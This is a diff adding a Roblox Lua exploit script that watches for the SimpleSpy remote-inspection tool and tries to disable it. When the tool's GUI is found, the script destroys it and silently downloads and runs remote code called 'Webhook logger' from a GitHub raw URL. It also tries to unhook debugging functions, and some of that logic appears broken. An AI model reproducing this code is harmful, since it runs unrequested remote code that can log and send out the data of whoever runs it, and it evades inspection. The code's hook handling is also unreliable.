@@ -1,0 +1,52 @@
+local function isHooked(func)
+    local mt = getrawmetatable(func)
+    if mt then
+        local original = rawget(mt, "__namecall")
+        return typeof(original) ~= "function"
+    end
+    return not pcall(function() return debug.info(func, "n") == nil end)
+end
+
+local hasRunWebhook = false
+
+local function removeSimpleSpyGUI()
+    local suspiciousNames = { "SimpleSpy2", "SimpleSpy", "Spy" }
+    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            local guiNameLower = gui.Name:lower()
+            for _, name in ipairs(suspiciousNames) do
+                if guiNameLower:find(name:lower()) then
+                    gui:Destroy()
+                    if not hasRunWebhook then
+                        hasRunWebhook = true
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/CaoModTesting/script/refs/heads/main/Webhook%20logger"))()
+                    end
+                    break
+                end
+            end
+        end
+    end
+end
+
+local function disableSimpleSpyHooks()
+    if isHooked(Instance.new("RemoteEvent").FireServer) then
+        hookfunction(Instance.new("RemoteEvent").FireServer, nil)
+    end
+
+    if isHooked(Instance.new("RemoteFunction").InvokeServer) then
+        hookfunction(Instance.new("RemoteFunction").InvokeServer, nil)
+    end
+
+    local suspiciousFunctions = { hookfunction, debug.getinfo, debug.setupvalue }
+    for _, func in ipairs(suspiciousFunctions) do
+        if isHooked(func) then
+            hookfunction(func, nil)
+        end
+    end
+end
+
+while true do
+    task.wait(1)
+    removeSimpleSpyGUI()
+    disableSimpleSpyHooks()
+end
